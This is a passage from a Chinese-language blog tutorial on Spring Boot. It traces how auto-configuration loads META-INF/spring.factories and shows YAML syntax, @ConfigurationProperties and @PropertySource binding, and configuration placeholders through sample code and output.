class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-comment">//自动配置包</span><br><span class="hljs-meta">@AutoConfigurationPackage</span><br><span class="hljs-comment">//给容器导入组件</span><br><span class="hljs-meta">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> EnableAutoConfiguration &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">ENABLED_OVERRIDE_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.boot.enableautoconfiguration&quot;</span>;<br><br>    Class&lt;?&gt;[] exclude() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    String[] excludeName() <span class="hljs-keyword">default</span> &#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-comment">//Spring底层注解@import ， 给容器中导入一个组件，Registrar.class 作用：将主启动类的所在包及包下面所有子包里面的所有组件扫描到Spring容器 ；</span><br><span class="hljs-meta">@Import(&#123;AutoConfigurationPackages.Registrar.class&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> AutoConfigurationPackage &#123;<br>    String[] basePackages() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    Class&lt;?&gt;[] basePackageClasses() <span class="hljs-keyword">default</span> &#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 @Import({AutoConfigurationImportSelector.class})</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span><br>-&gt;AutoConfigurationImportSelector<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoConfigurationImportSelector</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DeferredImportSelector</span>, BeanClassLoaderAware, ResourceLoaderAware, BeanFactoryAware, EnvironmentAware, Ordered &#123;<br>    ...<br>    <span class="hljs-comment">//获取所有候选的自动配置类;AnnotationMetadata metadata：标注了 @EnableAutoConfiguration 或 @SpringBootApplication 的类的注解信息;AnnotationAttributes attributes：注解的属性集合，比如 exclude、excludeName 等</span><br>    <span class="hljs-keyword">protected</span> List&lt;String&gt; <span class="hljs-title function_">getCandidateConfigurations</span><span class="hljs-params">(AnnotationMetadata metadata, AnnotationAttributes attributes)</span> &#123;<br>            <span class="hljs-comment">//通过 SpringFactoriesLoader 从 META-INF/spring.factories 文件中加载自动配置类名</span><br>        List&lt;String&gt; configurations = SpringFactoriesLoader.loadFactoryNames(<span class="hljs-built_in">this</span>.getSpringFactoriesLoaderFactoryClass(), <span class="hljs-built_in">this</span>.getBeanClassLoader());<br>            <span class="hljs-comment">//configurations 不为空，如果为空，抛出异常提示</span><br>        Assert.notEmpty(configurations, <span class="hljs-string">&quot;No auto configuration classes found in META-INF/spring.factories. If you are using a custom packaging, make sure that file is correct.&quot;</span>);<br>            <span class="hljs-comment">//返回启动自动导入配置文件的注解类；EnableAutoConfiguration</span><br>        <span class="hljs-keyword">return</span> configurations;<br>        &#125;<br>-&gt;SpringFactoriesLoader.loadFactoryNames<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringFactoriesLoader</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">loadFactoryNames</span><span class="hljs-params">(Class&lt;?&gt; factoryType, <span class="hljs-meta">@Nullable</span> ClassLoader classLoader)</span> &#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoaderToUse</span> <span class="hljs-operator">=</span> classLoader;<br>        <span class="hljs-keyword">if</span> (classLoader == <span class="hljs-literal">null</span>) &#123;<br>            classLoaderToUse = SpringFactoriesLoader.class.getClassLoader();<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">factoryTypeName</span> <span class="hljs-operator">=</span> factoryType.getName();<br>        <span class="hljs-comment">//调用了 loadSpringFactories 方法</span><br>        <span class="hljs-keyword">return</span> (List)loadSpringFactories(classLoaderToUse).getOrDefault(factoryTypeName, Collections.emptyList());<br>    &#125;<br>-&gt;loadSpringFactories<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, List&lt;String&gt;&gt; <span class="hljs-title function_">loadSpringFactories</span><span class="hljs-params">(ClassLoader classLoader)</span> &#123;<br>        <span class="hljs-comment">//cache 是静态缓存，避免每次都扫描文件。如果缓存存在，直接返回，提升性能</span><br>        Map&lt;String, List&lt;String&gt;&gt; result = (Map)cache.get(classLoader);<br>        <span class="hljs-keyword">if</span> (result != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//扫描 META-INF/spring.factories</span><br>                Enumeration&lt;URL&gt; urls = classLoader.getResources(<span class="hljs-string">&quot;META-INF/spring.factories&quot;</span>);<br><br>                <span class="hljs-comment">//将每个 spring.factories 文件包装成 UrlResource。使用 PropertiesLoaderUtils 加载为 Properties 对象，key=value 的形式</span><br>                <span class="hljs-keyword">while</span>(urls.hasMoreElements()) &#123;<br>                    <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> (URL)urls.nextElement();<br>                    <span class="hljs-type">UrlResource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlResource</span>(url);<br>                    <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> PropertiesLoaderUtils.loadProperties(resource);<br><br>                    <span class="hljs-comment">//遍历文件中的每个条目,把实现类加入列表</span><br>                    <span class="hljs-keyword">for</span>(Map.Entry&lt;?, ?&gt; entry : properties.entrySet()) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">factoryTypeName</span> <span class="hljs-operator">=</span> ((String)entry.getKey()).trim();<br>                        String[] factoryImplementationNames = StringUtils.commaDelimitedListToStringArray((String)entry.getValue());<br><br>                        <span class="hljs-keyword">for</span>(String factoryImplementationName : factoryImplementationNames) &#123;<br>                            ((List)result.computeIfAbsent(factoryTypeName, (key) -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>())).add(factoryImplementationName.trim());<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">//去重 distinct(),转为 不可修改列表（unmodifiableList）</span><br>                result.replaceAll((factoryType, implementations) -&gt; (List)implementations.stream().distinct().collect(Collectors.collectingAndThen(Collectors.toList(), Collections::unmodifiableList)));<br>                <span class="hljs-comment">//缓存结果并返回</span><br>                cache.put(classLoader, result);<br>                <span class="hljs-keyword">return</span> result;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>                <span class="hljs-comment">//读取文件出错时，抛出 IllegalArgumentException 异常</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unable to load factories from location [META-INF/spring.factories]&quot;</span>, ex);<br>            &#125;<br>        &#125;<br>    &#125;<br>-&gt;spring.factories （既然是对此文件做改动，那么全局搜索此文件）<br></code></pre></td></tr></table></figure><p>查看后发现都是自动配置文件，这就是自动配置的根源</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304861.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304988.png"></p><h5 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h5><p><font style="color:rgba(0, 0, 0, 0.9);">SpringBoot在启动的时候从类路径下的 META-INF&#x2F;spring.factories（spring-boot-autoconfigure-2.6.13.jar!\META-INF\spring.factories）中获取 EnableAutoConfiguration 指定的自动配置值</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304335.jpeg"></p><h4 id="SpringApplication"><a href="#SpringApplication" class="headerlink" title="SpringApplication"></a>SpringApplication</h4><p><strong><font style="color:rgba(0, 0, 0, 0.9);">这个类主要做了以下四件事情：</font></strong></p><p><font style="color:rgba(0, 0, 0, 0.9);">1、推断应用的类型是普通的项目还是Web项目</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">2、查找并加载所有可用初始化器 ， 设置到initializers属性中</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">3、找出所有的应用程序监听器，设置到listeners属性中</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">4、推断并设置main方法的定义类，找到运行的主类</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SpringApplication.run(Springboot01HelloworldApplication.class, args);<br></code></pre></td></tr></table></figure><h1 id="3、SpringBoot-配置"><a href="#3、SpringBoot-配置" class="headerlink" title="3、SpringBoot 配置"></a>3、SpringBoot 配置</h1><p><font style="color:rgba(0, 0, 0, 0.9);">SpringBoot使用一个全局的配置文件 ， 配置文件名称是固定的</font></p><ul><li><font style="color:rgba(0, 0, 0, 0.9);">application.properties</font><ul><li><font style="color:rgba(0, 0, 0, 0.9);">语法结构 ：key&#x3D;value</font></li></ul></li><li><font style="color:rgba(0, 0, 0, 0.9);">application.yml</font><ul><li><font style="color:rgba(0, 0, 0, 0.9);">语法结构 ：key：空格 value</font></li></ul></li></ul><p><strong><font style="color:rgba(0, 0, 0, 0.9);">配置文件的作用 ：</font></strong><font style="color:rgba(0, 0, 0, 0.9);">修改SpringBoot自动配置的默认值，因为SpringBoot在底层都给我们自动配置好了；</font></p><h2 id="yaml概述"><a href="#yaml概述" class="headerlink" title="yaml概述"></a>yaml概述</h2><p><a href="https://www.ruanyifeng.com/blog/2016/07/yaml.html">YAML 语言教程 - 阮一峰的网络日志</a></p><h2 id="yaml-语法"><a href="#yaml-语法" class="headerlink" title="yaml 语法"></a>yaml 语法</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 普通的 key-value</span><br><span class="hljs-attr">name:</span> <span class="hljs-string">qwe</span><br><br><span class="hljs-comment"># 对象</span><br><span class="hljs-attr">student:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">qwe</span><br>  <span class="hljs-attr">age:</span> <span class="hljs-number">11</span><br><br><span class="hljs-attr">student:</span> &#123;<span class="hljs-attr">name:</span> <span class="hljs-string">qwe</span>, <span class="hljs-attr">age:</span> <span class="hljs-number">1</span>&#125;<br><br><span class="hljs-comment"># 数组</span><br><span class="hljs-attr">pets:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">cat</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">dog</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">pig</span><br><br><span class="hljs-attr">pets:</span> [<span class="hljs-string">cat</span>,<span class="hljs-string">dog</span>,<span class="hljs-string">pig</span>]<br></code></pre></td></tr></table></figure><h2 id="yaml注入配置文件"><a href="#yaml注入配置文件" class="headerlink" title="yaml注入配置文件"></a>yaml注入配置文件</h2><p>**@ConfigurationProperties **作用：将配置文件中配置的每一个属性的值，映射到这个组件中；告诉 SpringBoot 将本类中的所有属性和配置文件中相关的配置进行绑定参数 <strong>prefix &#x3D; “person”</strong> : 将配置文件中的person下面的所有属性一一对应</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;person&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Boolean happy;<br>    <span class="hljs-keyword">private</span> Date birth;<br>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; maps;<br>    <span class="hljs-keyword">private</span> List&lt;Object&gt; lists;<br>    <span class="hljs-keyword">private</span> Dog dog;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, Date birth, Boolean happy, List&lt;Object&gt; lists, Map&lt;String, Object&gt; maps, Dog dog)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.birth = birth;<br>        <span class="hljs-built_in">this</span>.happy = happy;<br>        <span class="hljs-built_in">this</span>.lists = lists;<br>        <span class="hljs-built_in">this</span>.maps = maps;<br>        <span class="hljs-built_in">this</span>.dog = dog;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Boolean <span class="hljs-title function_">getHappy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> happy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHappy</span><span class="hljs-params">(Boolean happy)</span> &#123;<br>        <span class="hljs-built_in">this</span>.happy = happy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">getBirth</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> birth;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBirth</span><span class="hljs-params">(Date birth)</span> &#123;<br>        <span class="hljs-built_in">this</span>.birth = birth;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">getMaps</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> maps;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMaps</span><span class="hljs-params">(Map&lt;String, Object&gt; maps)</span> &#123;<br>        <span class="hljs-built_in">this</span>.maps = maps;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> List&lt;Object&gt; <span class="hljs-title function_">getLists</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> lists;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLists</span><span class="hljs-params">(List&lt;Object&gt; lists)</span> &#123;<br>        <span class="hljs-built_in">this</span>.lists = lists;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Dog <span class="hljs-title function_">getDog</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> dog;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDog</span><span class="hljs-params">(Dog dog)</span> &#123;<br>        <span class="hljs-built_in">this</span>.dog = dog;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>        <span class="hljs-string">&quot;, happy=&quot;</span> + happy +<br>        <span class="hljs-string">&quot;, birth=&quot;</span> + birth +<br>        <span class="hljs-string">&quot;, maps=&quot;</span> + maps +<br>        <span class="hljs-string">&quot;, lists=&quot;</span> + lists +<br>        <span class="hljs-string">&quot;, dog=&quot;</span> + dog +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8123</span><br><br><span class="hljs-attr">person:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">qwe</span><br>  <span class="hljs-attr">age:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">happy:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">birth:</span> <span class="hljs-string">&quot;1009/09/08&quot;</span><br>  <span class="hljs-attr">maps:</span><br>    <span class="hljs-attr">k1:</span> <span class="hljs-string">v1</span><br>    <span class="hljs-attr">k2:</span> <span class="hljs-string">v2</span><br>  <span class="hljs-attr">lists:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">code</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">music</span><br>  <span class="hljs-attr">dog:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">wang</span><br>    <span class="hljs-attr">age:</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><br><span class="hljs-keyword">import</span> com.kuang.pojo.Person;<br><span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;<br><br><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Springboot01HelloworldApplicationTests</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> Person person;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoads</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(person);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Person{name&#x3D;’qwe’, age&#x3D;1, happy&#x3D;false, birth&#x3D;Thu Sep 08 00:00:00 CST 1009, maps&#x3D;{k1&#x3D;v1, k2&#x3D;v2}, lists&#x3D;[code, music], dog&#x3D;Dog{name&#x3D;’wang’, age&#x3D;1}}</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304357.png"></p><h2 id="加载指定的配置文件"><a href="#加载指定的配置文件" class="headerlink" title="加载指定的配置文件"></a>加载指定的配置文件</h2><p><strong><font style="color:rgba(0, 0, 0, 0.9);">@PropertySource ：</font></strong><font style="color:rgba(0, 0, 0, 0.9);">加载指定的配置文件；</font></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">@configurationProperties</font></strong><font style="color:rgba(0, 0, 0, 0.9);">：默认从全局配置文件中获取值；</font></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">name</span>=<span class="hljs-string">qaz</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//指定加载 person.properties文件</span><br><span class="hljs-meta">@PropertySource(value = &quot;classpath:person.properties&quot;)</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-comment">//@ConfigurationProperties(prefix = &quot;person&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><br>    <span class="hljs-meta">@Value(&quot;$&#123;name&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Boolean happy;<br>    <span class="hljs-keyword">private</span> Date birth;<br>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; maps;<br>    <span class="hljs-keyword">private</span> List&lt;Object&gt; lists;<br>    <span class="hljs-keyword">private</span> Dog dog;<br></code></pre></td></tr></table></figure><hr><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304970.png"></p><h2 id="配置文件占位符"><a href="#配置文件占位符" class="headerlink" title="配置文件占位符"></a>配置文件占位符</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">qwe$&#123;random.uuid&#125;</span> <span class="hljs-comment"># 随机uuid</span><br>    <span class="hljs-attr">age:</span> <span class="hljs-string">$&#123;random.int&#125;</span>  <span class="hljs-comment"># 随机int</span><br>    <span class="hljs-attr">happy:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">birth:</span> <span class="hljs-number">2000</span><span class="hljs-string">/01/01</span><br>    <span class="hljs-attr">maps:</span> &#123;<span class="hljs-attr">k1:</span> <span class="hljs-string">v1</span>,<span class="hljs-attr">k2:</span> <span class="hljs-string">v2</span>&#125;<br>    <span class="hljs-attr">lists:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">code</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">music</span><br>    <span class="hljs-attr">dog:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">$&#123;person.hello:other&#125;_旺财</span><br>      <span class="hljs-attr">age:</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304522.png"></p><h3 id="小结：-1"><a href="#小结：-1" class="headerlink" title="小结："></a>小结：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304628.webp"></p><p><font style="color:rgba(0, 0, 0, 0.9);">JSR303数据校验 ， 可以在字段是增加一层过滤器验证 ， 可以保证数据的合法性</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">松散绑定：yml 中写的 last-name 和 lastName是一样的</font></p><p><font style="color:rgba(0, 0, 0, 